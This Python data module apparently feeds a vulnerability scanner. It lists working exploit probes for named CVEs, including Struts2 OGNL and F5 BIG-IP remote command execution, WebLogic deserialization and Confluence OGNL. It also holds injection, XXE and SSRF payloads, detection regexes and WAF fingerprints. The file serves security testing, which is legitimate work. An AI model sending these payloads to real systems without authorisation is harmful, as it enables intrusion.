"""
payloads.py — CVE probes, CWE probes, signature libraries, and WAF fingerprints
for scanner.py.

Pure data. No network I/O. Safe to import from anywhere.
"""
from typing import Dict, List, Tuple


# ================================================================
# CWE FRIENDLY NAMES
# ================================================================
CWE_NAMES: Dict[str, str] = {
    "CWE-20":   "Input Validation",
    "CWE-22":   "Path Traversal",
    "CWE-78":   "Command Injection (OS)",
    "CWE-79":   "XSS",
    "CWE-89":   "SQL Injection",
    "CWE-90":   "LDAP Injection",
    "CWE-94":   "Code Injection / SSTI",
    "CWE-95":   "Eval Injection",
    "CWE-113":  "CRLF / Header Injection",
    "CWE-119":  "Buffer Overflow",
    "CWE-125":  "Out-of-bounds Read",
    "CWE-200":  "Information Disclosure",
    "CWE-287":  "Authentication Bypass",
    "CWE-295":  "Improper Certificate Validation",
    "CWE-306":  "Missing Auth for Critical Function",
    "CWE-319":  "Cleartext Transmission",
    "CWE-326":  "Inadequate Encryption Strength",
    "CWE-352":  "CSRF",
    "CWE-377":  "Insecure Temp File",
    "CWE-400":  "Uncontrolled Resource Consumption",
    "CWE-416":  "Use After Free",
    "CWE-434":  "Unrestricted File Upload",
    "CWE-476":  "NULL Pointer Dereference",
    "CWE-502":  "Insecure Deserialization",
    "CWE-601":  "Open Redirect",
    "CWE-611":  "XXE",
    "CWE-643":  "XPath Injection",
    "CWE-697":  "Incorrect Comparison",
    "CWE-732":  "Incorrect Permission Assignment",
    "CWE-787":  "Out-of-bounds Write",
    "CWE-798":  "Hardcoded Credentials",
    "CWE-862":  "Missing Authorization",
    "CWE-863":  "Incorrect Authorization",
    "CWE-918":  "SSRF",
    "CWE-943":  "NoSQL Injection",
    "CWE-1021": "Clickjacking",
    "CWE-1104": "Unmaintained Component",
    "CWE-1321": "Prototype Pollution",
    "CWE-1333": "ReDoS",
}


# ================================================================
# CVE-SPECIFIC PROBES (18 entries)
# ================================================================
CVE_PROBES: Dict[str, dict] = {
    "CVE-2021-41773": {
        "label": "Apache HTTP Server 2.4.49 Path Traversal",
        "probes": [
            {"path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
             "sig": {"passwd": r"root:[x*]?:0:0:"}},
        ],
    },
    "CVE-2021-42013": {
        "label": "Apache HTTP Server 2.4.50 Path Traversal (bypass)",
        "probes": [
            {"path": "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
             "sig": {"passwd": r"root:[x*]?:0:0:"}},
            {"path": "/icons/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
             "sig": {"passwd": r"root:[x*]?:0:0:"}},
        ],
    },
    "CVE-2019-19781": {
        "label": "Citrix ADC / Gateway Path Traversal",
        "probes": [
            {"path": "/vpn/../vpns/cfg/smb.conf",
             "sig": {"smb_conf": r"\[global\]"}},
            {"path": "/vpns/../vpns/cfg/smb.conf",
             "sig": {"smb_conf": r"\[global\]"}},
        ],
    },
    "CVE-2019-11510": {
        "label": "Pulse Secure Path Traversal",
        "probes": [
            {"path": "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
             "sig": {"passwd": r"root:[x*]?:0:0:"}},
        ],
    },
    "CVE-2022-1388": {
        "label": "F5 BIG-IP iControl REST Auth Bypass",
        "probes": [
            {"method": "POST",
             "path": "/mgmt/tm/util/bash",
             "headers": {"X-F5-Auth-Token": "anything",
                         "Connection": "X-F5-Auth-Token",
                         "Content-Type": "application/json"},
             "json_body": {"command": "run", "utilCmdArgs": "-c id"},
             "require_status": [200],
             "sig": {"f5_bash": r"\"commandResult\"|\"kind\":\"tm:util:bash:runstate\""}},
        ],
    },
    "CVE-2020-14882": {
        "label": "Oracle WebLogic Console Auth Bypass",
        "probes": [
            {"path": "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread.currentThread().getContextClassLoader()')",
             "require_status": [200],
             "sig": {"weblogic_console": r"WebLogic|console\.portal|Oracle"}},
        ],
    },
    "CVE-2017-5638": {
        "label": "Apache Struts2 S2-045 RCE",
        "probes": [
            {"method": "GET",
             "path": "/",
             "headers": {"Content-Type": (
                 "%{(#_='multipart/form-data')."
                 "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                 "(#_memberAccess?(#_memberAccess=#dm):"
                 "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                 "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                 "(#ognlUtil.getExcludedPackageNames().clear())."
                 "(#ognlUtil.getExcludedClasses().clear())."
                 "(#context.setMemberAccess(#dm))))."
                 "(#cmd='id')."
                 "(#cmds={'/bin/bash','-c',#cmd})."
                 "(#p=new java.lang.ProcessBuilder(#cmds))."
                 "(#p.redirectErrorStream(true))."
                 "(#process=#p.start())."
                 "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                 "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                 "(#ros.flush())}"
             )},
             "sig": {"uid_gid": r"uid=\d+\([^)]*\)"}},
        ],
    },
    "CVE-2017-9805": {
        "label": "Apache Struts2 S2-052 REST RCE",
        "probes": [
            {"method": "POST",
             "path": "/orders/3/edit",
             "headers": {"Content-Type": "application/xml"},
             "data": (
                 '<map><entry>'
                 '<jdk.nashorn.internal.objects.NativeString>'
                 '<flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">'
                 '<dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">'
                 '<is class="javax.crypto.CipherInputStream">'
                 '<cipher class="javax.crypto.NullCipher"><initialized>false</initialized></cipher>'
                 '<input class="java.io.ByteArrayInputStream"><buf>[base64]</buf></input>'
                 '</is><contentType>text/plain</contentType></dataSource></dataHandler>'
                 '</value></jdk.nashorn.internal.objects.NativeString></entry></map>'
             ),
             "sig": {"struts2_error": r"Struts|OGNL|ClassCastException"}},
        ],
    },
    "CVE-2022-26134": {
        "label": "Atlassian Confluence OGNL Injection (post-auth)",
        "probes": [
            {"path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D%2F.%2F",
             "sig": {"confluence": r"Confluence|OGNL|X-CVE-PROBE"}},
        ],
    },
    "CVE-2021-26084": {
        "label": "Atlassian Confluence Pre-Auth OGNL",
        "probes": [
            {"method": "POST",
             "path": "/pages/doenterpagevariables.action",
             "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "data": "queryString=%5Cu0027%2B%7BClass.forName%28%5Cu0027java.lang.Runtime%5Cu0027%29.getMethod%28%5Cu0027getRuntime%5Cu0027%2Cnull%29.invoke%28null%2Cnull%29.exec%28%5Cu0027id%5Cu0027%29%7D",
             "sig": {"confluence_error": r"Confluence|OGNL|XPathException"}},
        ],
    },
    "CVE-2021-26855": {
        "label": "Exchange ProxyLogon SSRF",
        "probes": [
            {"path": "/ecp/x.jsx",
             "headers": {"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt"},
             "sig": {"proxylogon": r"Negotiate|X-BEResource|X-CalculatedBETarget"}},
        ],
    },
    "CVE-2021-34473": {
        "label": "Exchange ProxyShell RCE",
        "probes": [
            {"path": "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com&Protocol=XYZ&Mailbox=autodiscover/autodiscover.json%3F@test.com",
             "sig": {"proxyshell": r"X-FEServer|X-BackEndCookie|autodiscover"}},
        ],
    },
    "CVE-2021-21972": {
        "label": "VMware vCenter Server vROPs RCE",
        "probes": [
            {"method": "POST",
             "path": "/ui/vropspluginui/rest/services/uploadova",
             "headers": {"Content-Type": "application/octet-stream"},
             "data": "BOUNDARY",
             "sig": {"vrops": r"vropspluginui|uploadova|vROPs"}},
        ],
    },
    "CVE-2021-21985": {
        "label": "VMware vCenter vSAN Plugin RCE",
        "probes": [
            {"path": "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVrUsageDisabled/setTarget/",
             "sig": {"vsan": r"vsanProviderUtils|h5-vsan"}},
        ],
    },
    "CVE-2024-3400": {
        "label": "PAN-OS GlobalProtect Command Injection",
        "probes": [
            {"path": "/global-protect/login.esp",
             "headers": {"Cookie": (
                 "SESSID=/../../../var/appweb/sslvpndocs/"
                 "global-protect/portal/images/cve-2024-3400.txt"
             )},
             "sig": {"pan_os": r"GlobalProtect|PanOS|Palo Alto"}},
        ],
    },
    "CVE-2019-2725": {
        "label": "WebLogic wls-wsat Deserialization",
        "probes": [
            {"method": "POST",
             "path": "/wls-wsat/CoordinatorPortType",
             "headers": {"Content-Type": "text/xml"},
             "data": (
                 '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                 '<soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">'
                 '<java version="1.8" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder">'
                 '<array class="java.lang.String" length="1"><void index="0"><string>/bin/id</string></void>'
                 '</array><void method="start"/></void></java></work:WorkContext></soapenv:Header>'
                 '<soapenv:Body/></soapenv:Envelope>'
             ),
             "sig": {"weblogic_wls": r"wls-wsat|WebLogic|X-CVE-PROBE"}},
        ],
    },
    "CVE-2016-4437": {
        "label": "Apache Shiro rememberMe Deserialization",
        "probes": [
            {"path": "/",
             "headers": {"Cookie": (
                 "rememberMe=rO0ABXNyAA1qYXZhLnV0aWwuTWFwASJV+1PjCyYCAAB4cHcIAAAAATAAc3IADmphdmEubGFuZy5Mb25n7Xpr+KiN7SgCAAB4cgAQamF2YS5sYW5nLk51bWJlcoVr66C8Z6HqAgABTAAKdmFsdWVMb25ndAAPTGphdmEvbGFuZy9Mb25nO3hwdAAIAAAAAAAAAAE="
             )},
             "sig": {"shiro": r"rememberMe|Shiro|deleteMe|X-CVE-PROBE"}},
        ],
    },
    "CVE-2023-4966": {
        "label": "Citrix Bleed (Session Token Leak)",
        "probes": [
            {"path": "/oauth/idp/.well-known/openid-configuration",
             "headers": {"Host": "a" * 24576 + ".example.com"},
             "require_status": [200],
             "sig": {"citrix_leak": r"ctx\.session|citrix_session|NSC_[A-Za-z0-9]{20,}|ctxt[0-9]{8,}"}},
        ],
    },
}


# ================================================================
# SIGNATURE LIBRARIES
# ================================================================
SQL_ERROR_SIGNATURES: List[Tuple[str, str]] = [
    (r"SQL syntax.*MySQL", "mysql"),
    (r"Warning.*mysql_", "mysql"),
    (r"MySqlException", "mysql"),
    (r"valid MySQL result", "mysql"),
    (r"mysql_fetch_(array|assoc|row|object)\(\)", "mysql"),
    (r"mysql_num_rows\(\)", "mysql"),
    (r"mysql_query\(\)", "mysql"),
    (r"com\.mysql\.jdbc", "mysql"),
    (r"MariaDB server version", "mysql"),
    (r"MySqlClient\.", "mysql"),
    (r"check the manual that corresponds to your (MySQL|MariaDB) server version", "mysql"),
    (r"Table '[^']+' doesn't exist", "mysql"),
    (r"You have an error in your SQL syntax", "mysql"),
    (r"PostgreSQL.*ERROR", "postgresql"),
    (r"pg_query\(\)", "postgresql"),
    (r"pg_exec\(\)", "postgresql"),
    (r"PSQLException", "postgresql"),
    (r"unterminated quoted string at or near", "postgresql"),
    (r"pg_catalog", "postgresql"),
    (r"current_schema\(\)", "postgresql"),
    (r"syntax error at or near", "postgresql"),
    (r"column .* does not exist", "postgresql"),
    (r"relation .* does not exist", "postgresql"),
    (r"invalid input syntax for type", "postgresql"),
    (r"ORA-\d{5}", "oracle"),
    (r"Oracle.*Driver", "oracle"),
    (r"quoted string not properly ended", "oracle"),
    (r"oracle\.jdbc", "oracle"),
    (r"ORA-00933", "oracle"),
    (r"ORA-00936", "oracle"),
    (r"ORA-01756", "oracle"),
    (r"Microsoft.*ODBC.*SQL Server", "mssql"),
    (r"SQLServer JDBC Driver", "mssql"),
    (r"SqlException", "mssql"),
    (r"System\.Data\.SqlClient", "mssql"),
    (r"\.Net SqlClient Data Provider", "mssql"),
    (r"Msg \d+, Level \d+, State \d+", "mssql"),
    (r"Incorrect syntax near", "mssql"),
    (r"Unclosed quotation mark after the character string", "mssql"),
    (r"Conversion failed when converting", "mssql"),
    (r"SQLite/JDBCDriver", "sqlite"),
    (r"SQLite\.Exception", "sqlite"),
    (r"System\.Data\.SQLite\.SQLiteException", "sqlite"),
    (r"\[SQLITE_ERROR\]", "sqlite"),
    (r"SQLite3::SQLException", "sqlite"),
    (r"near .*: syntax error", "sqlite"),
    (r"SQL command not properly ended", "generic"),
    (r"ODBC SQL Server Driver", "generic"),
    (r"JDBC SQL Server Driver", "generic"),
]

XSS_SIGNATURES: Dict[str, str] = {
    "raw_script": r"(?i)<script[^>]*>.*?</script>",
    "script_src": r"(?i)<script[^>]+src\s*=\s*[\"']?[^\"'>]+",
    "svg_onload": r"(?i)<svg[^>]+onload\s*=",
    "img_onerror": r"(?i)<img[^>]+onerror\s*=",
    "body_onload": r"(?i)<body[^>]+onload\s*=",
    "input_onfocus": r"(?i)<input[^>]+onfocus\s*=",
    "details_ontoggle": r"(?i)<details[^>]+ontoggle\s*=",
    "video_onerror": r"(?i)<video[^>]+onerror\s*=",
    "audio_onerror": r"(?i)<audio[^>]+onerror\s*=",
    "javascript_uri": r"(?i)javascript\s*:\s*[^\s\"']",
    "data_uri_script": r"(?i)data\s*:\s*text/html[^,]*,",
    "dom_innerhtml": r"(?i)\.innerHTML\s*=",
    "dom_outerhtml": r"(?i)\.outerHTML\s*=",
    "dom_document_write": r"(?i)document\.write\s*\(",
    "dom_eval": r"(?i)\beval\s*\(",
    "dom_settimeout": r"(?i)setTimeout\s*\(\s*[\"']",
    "dom_function": r"(?i)new\s+Function\s*\(",
    "angular_bypass": r"(?i)\$sce\.trustAsHtml",
    "react_dangerously": r"(?i)dangerouslySetInnerHTML",
    "html_entity_script": r"(?i)&lt;script",
    "double_encoded": r"(?i)%253Cscript",
    "unicode_escape": r"(?i)\\u003cscript",
    "xss_marker": r"XSSMARK\d*",
}

LFI_SIGNATURES: Dict[str, str] = {
    "passwd_file": r"root:[x*]?:0:0:",
    "shadow_file": r"root:[*!]?:[0-9]+:[0-9]+:",
    "etc_hosts": r"127\.0\.0\.1\s+localhost",
    "etc_group": r"root:x:0:",
    "proc_self_environ": r"PATH=/",
    "proc_version": r"Linux version \d+\.\d+",
    "proc_cmdline": r"BOOT_IMAGE=",
    "ssh_key": r"-----BEGIN (RSA|OPENSSH|EC|DSA) PRIVATE KEY-----",
    "boot_ini": r"\[boot loader\]",
    "win_ini": r"\[fonts\]",
    "win_system_ini": r"\[386Enh\]",
    "win_win_ini": r"\[windows\]",
    "win_sam": r"SAM\\Domains\\Account",
    "php_filter_chain": r"php://filter",
    "php_input": r"php://input",
    "php_data": r"data://text/plain",
    "php_expect": r"expect://",
    "php_zip": r"zip://",
    "php_phar": r"phar://",
    "apache_access_log": r"\d+\.\d+\.\d+\.\d+ - - \[",
    "nginx_access_log": r"\d+\.\d+\.\d+\.\d+ - - \[",
}

RCE_SIGNATURES: Dict[str, str] = {
    "uid_gid": r"uid=\d+\([^)]*\)\s+gid=\d+\([^)]*\)",
    "www_data": r"www-data:",
    "root_shell": r"root@[a-zA-Z0-9_-]+:",
    "bin_bash": r"/bin/(ba)?sh",
    "nobody_user": r"nobody:",
    "nt_authority": r"NT AUTHORITY\\",
    "administrator": r"Administrator:",
    "volume_serial": r"Volume Serial Number is",
    "windows_dir": r"Directory of C:\\Windows",
    "windows_ipconfig": r"Windows IP Configuration",
    "sh_not_found": r"/bin/sh: .*: not found",
    "cmd_not_found": r"'[^']+' is not recognized as an internal or external command",
    "powershell_error": r"At line:\d+ char:\d+",
}

SSTI_SIGNATURES: Dict[str, str] = {
    "jinja_error": r"jinja2\.exceptions\.",
    "twig_error": r"Twig\\Error\\",
    "freemarker_error": r"freemarker\.core\.ParseException",
    "mako_error": r"mako\.exceptions\.",
    "velocity_error": r"org\.apache\.velocity",
    "handlebars_error": r"Handlebars\.Exception",
    "smarty_error": r"Smarty error",
    "erubis_error": r"Erubis::",
    "evaluated_49": r"(?<![\d])49(?![\d])",
    "evaluated_7777777": r"7777777",
    "evaluated_79005424": r"(?<![\d])79005424(?![\d])",
    "evaluated_343": r"(?<![\d])343(?![\d])",
    "literal_expression": r"\{\{[^}]+\}\}",
    "literal_dollar": r"\$\{[^}]+\}",
    "literal_erb": r"<%= [^%]+ %>",
}

SSRF_SIGNATURES: Dict[str, str] = {
    "aws_imds": r"ami-id|instance-id|iam/security-credentials",
    "aws_metadata": r"latest/meta-data",
    "gcp_metadata": r"metadata\.google\.internal",
    "gcp_project": r"project-id",
    "azure_metadata": r"169\.254\.169\.254",
    "azure_imds": r"metadata/instance",
    "alibaba_metadata": r"100\.100\.100\.200",
    "redis_info": r"redis_version:",
    "mysql_banner": r"\d+\.\d+\.\d+.*MySQL",
    "postgres_banner": r"PostgreSQL \d+\.\d+",
    "elasticsearch": r"\"cluster_name\"\s*:",
    "docker_api": r"\"ApiVersion\"\s*:",
    "kubernetes_api": r"\"kind\":\s*\"Pod\"",
    "consul_api": r"\"consul\"",
    "connection_refused": r"Connection refused",
    "timeout_internal": r"timed out",
    "gopher_dict": r"(gopher|dict)://",
    "file_protocol": r"file:///",
}

XXE_SIGNATURES: Dict[str, str] = {
    "passwd_leak": r"root:[x*]?:0:0:",
    "win_ini_leak": r"\[fonts\]",
    "ssh_key_leak": r"-----BEGIN (RSA|OPENSSH) PRIVATE KEY-----",
    "libxml_error": r"libxml2",
    "expat_error": r"expat",
    "java_sax_error": r"SAXParseException",
    "dotnet_xml_error": r"System\.Xml\.",
    "python_xml_error": r"xml\.etree\.ElementTree",
    "entity_expansion": r"&[a-zA-Z0-9_]+;",
    "doctype_entity": r"<!ENTITY",
    "external_dtd": r"<!DOCTYPE[^>]+SYSTEM",
    "parameter_entity": r"%[a-zA-Z0-9_]+;",
}

DESERIALIZATION_SIGNATURES: Dict[str, str] = {
    "java_magic_bytes": r"rO0AB",
    "java_stream_error": r"java\.io\.ObjectInputStream",
    "java_class_cast": r"java\.lang\.ClassCastException",
    "java_ysoserial": r"ysoserial",
    "php_serialized": r"O:\d+:\"[^\"]+\":\d+:\{",
    "php_unserialize_error": r"unserialize\(\): Error at offset",
    "php_pop_chain": r"__wakeup|__destruct|__toString",
    "pickle_magic": r"\x80\x03|\x80\x04|\x80\x05",
    "pickle_error": r"_pickle\.UnpicklingError",
    "yaml_load": r"yaml\.load\(",
    "dotnet_viewstate": r"/wEP",
    "binaryformatter_error": r"System\.Runtime\.Serialization\.BinaryFormatter",
    "dotnet_typeconfuse": r"TypeConfuseDelegate",
    "ruby_marshal": r"\x04\x08",
    "yaml_psych": r"Psych::SyntaxError|YAML\.load",
}

OPEN_REDIRECT_SIGNATURES: Dict[str, str] = {
    "evil_host": r"(?m)^Location\s*:\s*https?://[^/\s]*evil",
    "protocol_relative": r"(?m)^Location\s*:\s*//evil",
    "backslash_bypass": r"(?m)^Location\s*:\s*https?://[^/\s]*\\",
    "at_bypass": r"(?m)^Location\s*:\s*https?://[^@\s]*@evil",
    "meta_refresh": r"(?i)<meta[^>]+http-equiv=[\"']?refresh[^>]+url=[\"']?https?://evil",
    "js_location": r"(?i)(location\.href|window\.location)\s*=\s*[\"']https?://evil",
    "js_replace": r"(?i)location\.replace\s*\(\s*[\"']https?://evil",
}

NOSQL_SIGNATURES: Dict[str, str] = {
    "mongo_error": r"MongoError|MongoServerError|mongoengine",
    "mongo_operator": r"\$ne|\$gt|\$where|\$regex",
    "mongo_stack": r"pymongo\.errors",
    "couchdb_error": r"couchdb|CouchDB",
    "redis_error": r"redis\.exceptions|RedisError",
}

LDAP_SIGNATURES: Dict[str, str] = {
    "ldap_error": r"LDAPException|ldap_search|Invalid DN syntax",
    "ldap_filter": r"\(\s*[|&]\s*\(",
    "java_ldap": r"javax\.naming\.directory",
    "python_ldap": r"ldap\.LDAPError",
}

XPATH_SIGNATURES: Dict[str, str] = {
    "xpath_error": r"XPathException|XPath syntax error",
    "libxml_xpath": r"xmlXPathEval",
    "java_xpath": r"javax\.xml\.xpath",
}

CRLF_SIGNATURES: Dict[str, str] = {
    "injected_header": r"(?m)^X-Injected:\s*",
    "set_cookie_inject": r"(?m)^Set-Cookie:\s*.*\r?\n",
    "response_split": r"\r\n\r\nHTTP/1\.[01] \d{3}",
}


# ================================================================
# WAF FINGERPRINTS (9 vendors)
# ================================================================
WAF_FINGERPRINTS: Dict[str, dict] = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "server:cloudflare"],
        "body": ["attention required! | cloudflare", "/cdn-cgi/challenge-platform/",
                 "ray id:", "cloudflare to restrict access"],
        "cookies": ["__cf_bm", "cf_clearance"],
        "status": [403, 503],
    },
    "akamai": {
        "headers": ["server:akamaighost", "akamai-bot-manager"],
        "body": ["access denied | akamai", "reference #"],
        "cookies": ["ak_bmsc", "bm_sv"],
        "status": [403],
    },
    "imperva_incapsula": {
        "headers": ["x-iinfo"],
        "body": ["incapsula incident id", "powered by incapsula", "_Incapsula_Resource"],
        "cookies": ["incap_ses", "visid_incap"],
        "status": [403],
    },
    "f5_big_ip_asm": {
        "headers": ["x-wa-info", "x-cnection"],
        "body": ["the requested url was rejected", "support id:"],
        "cookies": ["TS01", "BIGipServer"],
        "status": [403],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "body": ["request blocked by aws waf"],
        "cookies": [],
        "status": [403],
    },
    "fortiweb": {
        "headers": ["server:fortiweb"],
        "body": ["fortiweb"],
        "cookies": [],
        "status": [403],
    },
    "barracuda": {
        "headers": ["barra_counter_session"],
        "body": ["barracuda"],
        "cookies": ["barra_counter_session"],
        "status": [403],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body": ["sucuri website firewall", "access denied - sucuri"],
        "cookies": [],
        "status": [403],
    },
    "modsecurity": {
        "headers": ["server:modsecurity"],
        "body": ["mod_security", "not acceptable"],
        "cookies": [],
        "status": [403, 406],
    },
}


# ================================================================
# CWE PROBES (14 entries)
# ================================================================
CWE_PROBES: Dict[str, dict] = {
    "CWE-79": {
        "label": "XSS (reflected)",
        "payloads": [
            '<svg/onload=alert("XSSMARK1")>',
            '"><script>alert("XSSMARK2")</script>',
            "'><img src=x onerror=alert('XSSMARK3')>",
            '<details open ontoggle=alert("XSSMARK4")>',
        ],
        "detect": "xss_reflection",
        "markers": ["XSSMARK1", "XSSMARK2", "XSSMARK3", "XSSMARK4"],
    },
    "CWE-89": {
        "label": "SQL Injection",
        "payloads": [
            "'; SELECT pg_sleep(4);-- -",
            "' OR SLEEP(4)-- -",
            "' AND SLEEP(4)-- -",
            "'; WAITFOR DELAY '0:0:4'-- -",
            "'",
            '"',
        ],
        "detect": "sql",
        "timing_threshold": 3.0,
    },
    "CWE-22": {
        "label": "Path Traversal",
        "payloads": [
            "../../../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "php://filter/convert.base64-encode/resource=index.php",
        ],
        "detect": "pattern",
        "signatures": LFI_SIGNATURES,
    },
    "CWE-78": {
        "label": "Command Injection",
        "payloads": [
            ";sleep 4;", "|id", "|sleep 4",
            "$(sleep 4)", "`id`", "& ping -c 4 127.0.0.1 &",
        ],
        "detect": "rce",
        "timing_threshold": 3.0,
    },
    "CWE-94": {
        "label": "SSTI",
        "payloads": [
            "{{8888*8888}}", "${8888*8888}",
            "<%= 8888*8888 %>", "#{8888*8888}",
            "{{7*7}}", "{{7*'7'}}",
        ],
        "detect": "ssti",
        "expected": "79005424",
    },
    "CWE-918": {
        "label": "SSRF",
        "payloads": [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:80/",
            "file:///etc/passwd",
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        "detect": "pattern",
        "signatures": SSRF_SIGNATURES,
    },
    "CWE-611": {
        "label": "XXE",
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ],
        "detect": "pattern",
        "signatures": XXE_SIGNATURES,
    },
    "CWE-502": {
        "label": "Insecure Deserialization",
        "payloads": [
            'O:8:"stdClass":1:{s:4:"test";s:4:"pwn3";}',
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAA2Zvb3QAAA==',
        ],
        "detect": "pattern",
        "signatures": DESERIALIZATION_SIGNATURES,
    },
    "CWE-601": {
        "label": "Open Redirect",
        "payloads": [
            "https://evil.example.com/",
            "//evil.example.com/",
            "/\\evil.example.com/",
            "https://legit.com@evil.example.com/",
        ],
        "detect": "redirect",
        "expected": "evil.example.com",
    },
    "CWE-943": {
        "label": "NoSQL Injection",
        "payloads": [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            "' || '1'=='1",
            '{"$where": "sleep(4000)"}',
        ],
        "detect": "pattern",
        "signatures": NOSQL_SIGNATURES,
    },
    "CWE-90": {
        "label": "LDAP Injection",
        "payloads": [
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
        ],
        "detect": "pattern",
        "signatures": LDAP_SIGNATURES,
    },
    "CWE-643": {
        "label": "XPath Injection",
        "payloads": [
            "' or '1'='1",
            "x' or name()='username' or 'x'='y",
            "' or count(/*)>0 or '1'='1",
        ],
        "detect": "pattern",
        "signatures": XPATH_SIGNATURES,
    },
    "CWE-113": {
        "label": "HTTP Header Injection (CRLF)",
        "payloads": [
            "%0d%0aX-Injected:%20true",
            "\r\nX-Injected: true",
            "%0aX-Injected:%20true",
        ],
        "detect": "pattern",
        "signatures": CRLF_SIGNATURES,
    },
    "CWE-1321": {
        "label": "Prototype Pollution",
        "payloads": [
            '{"__proto__": {"polluted": "yes"}}',
            '{"constructor": {"prototype": {"polluted": "yes"}}}',
        ],
        "detect": "pattern",
        "signatures": {"polluted": r"polluted", "proto_leak": r"__proto__"},
    },
}
